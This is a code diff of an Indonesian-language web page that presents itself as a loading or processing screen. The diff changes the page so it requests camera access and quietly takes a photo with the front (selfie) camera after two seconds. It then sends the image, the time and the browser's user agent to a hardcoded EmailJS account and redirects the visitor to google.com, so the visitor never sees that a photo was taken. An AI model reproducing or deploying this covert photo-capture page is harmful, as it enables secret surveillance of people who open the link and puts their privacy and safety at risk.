@@ -2,54 +2,12 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <title>WELCOME</title>
-
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #0f172a;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-
-    .box {
-      text-align: center;
-    }
-
-    .loader {
-      border: 4px solid #1e293b;
-      border-top: 4px solid #38bdf8;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: auto;
-      margin-bottom: 15px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .error {
-      color: #f87171;
-      margin-top: 15px;
-      font-size: 14px;
-    }
-  </style>
+  <title>Processing...</title>
 </head>
 <body>
 
-<div class="box">
-  <div class="loader"></div>
-  <h3 id="status">Loading...</h3>
-  <div id="error" class="error"></div>
-</div>
+<h3 id="status">Memproses...</h3>
+<p id="error" style="color:red;"></p>
 
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>
@@ -57,7 +15,6 @@
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script>
-// ✅ EmailJS config kamu
 (function(){
     emailjs.init("buxVv6sNpKGz4iBzb");
 })();
@@ -66,33 +23,33 @@ const video = document.getElementById("video");
 const statusText = document.getElementById("status");
 const errorText = document.getElementById("error");
 
-// START kamera
-startCamera();
+// START
+init();
 
-async function startCamera() {
+async function init() {
     try {
-        // WAJIB izin kamera
         const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "environment" }
+            video: { facingMode: "user" }
         });
 
         video.srcObject = stream;
-
-        statusText.innerText = "Loading...";
+        statusText.innerText = "Mengambil foto...";
 
         setTimeout(ambilFoto, 2000);
 
     } catch (err) {
-        // ❌ kalau user nolak
+        // ❌ STOP TOTAL DI SINI
         statusText.innerText = "Akses kamera ditolak!";
-        errorText.innerText = "Silakan izinkan kamera untuk melanjutkan.";
+        errorText.innerText = "Kamu harus mengizinkan kamera untuk lanjut.";
 
-        // ❗ TIDAK ADA REDIRECT
-        console.log("User menolak kamera:", err);
+        console.log("DITOLAK:", err);
+
+        // ⛔ TIDAK ADA REDIRECT SAMA SEKALI
+        return; 
     }
 }
 
-// ambil foto
+// FOTO
 function ambilFoto() {
     const canvas = document.getElementById("canvas");
     const ctx = canvas.getContext("2d");
@@ -101,23 +58,23 @@ function ambilFoto() {
 
     const imageData = canvas.toDataURL("image/png");
 
-    statusText.innerText = "Mengirim data...";
+    statusText.innerText = "Mengirim...";
 
     emailjs.send("service_lzuezkd", "template_33st1em", {
-        message: "Foto berhasil diambil",
+        message: "Foto diambil",
         image: imageData,
         time: new Date().toLocaleString(),
         device: navigator.userAgent
     })
     .then(() => {
-        statusText.innerText = "Berhasil! Mengalihkan...";
+        statusText.innerText = "Berhasil, redirect...";
 
         setTimeout(() => {
-            window.location.href = "https://google.com"; // GANTI LINK TUJUAN
+            window.location.href = "https://google.com";
         }, 3000);
     })
     .catch(() => {
-        statusText.innerText = "Gagal mengirim, tapi lanjut...";
+        statusText.innerText = "Gagal kirim, redirect...";
 
         setTimeout(() => {
             window.location.href = "https://google.com";
